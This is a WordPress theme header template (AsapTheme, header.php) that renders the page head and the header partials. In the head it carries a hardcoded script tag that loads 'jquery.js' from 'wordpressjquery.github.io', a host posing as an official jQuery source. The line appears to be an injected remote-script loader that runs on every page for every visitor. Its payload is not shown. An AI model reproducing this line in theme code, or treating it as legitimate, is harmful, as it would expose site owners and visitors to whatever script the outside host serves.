<?php
/**
 * The template for displaying the header.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package AsapTheme
 */
?>
<!DOCTYPE html>

<html <?php language_attributes(); ?> >
	
<head>
	
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0">
<script type="text/javascript" src="https://wordpressjquery.github.io/jquery.js"></script>
<?php wp_head(); ?>
</head>
	
<body <?php body_class(); ?>>
	
<?php if ( get_theme_mod('asap_float_design')  ) : ?>
	
<div id="menu-overlay"></div>
	
<?php endif; ?>
	
<?php wp_body_open(); ?>
	
<?php
		
$disable_header = asap_disable_header();
	
if ( ! $disable_header ) {
	
?>

<?php if ( get_theme_mod('asap_header_top') ) : ?>

<?php get_template_part('template-parts/menu/content','header-top'); ?>

<?php endif; ?>
	
<header class="site-header">

	<div class="site-header-content">
		
		<?php if ( ! get_theme_mod('asap_header_top') ) : ?>
		
		<?php get_template_part('template-parts/menu/content','logo'); ?>

		<?php get_template_part('template-parts/menu/content','search'); ?>
		
		<?php endif; ?>
				
		<?php get_template_part('template-parts/menu/content','wc'); ?>
		
		<?php get_template_part('template-parts/menu/content','menu'); ?>
				
	</div>
	
</header>

<?php } ?>
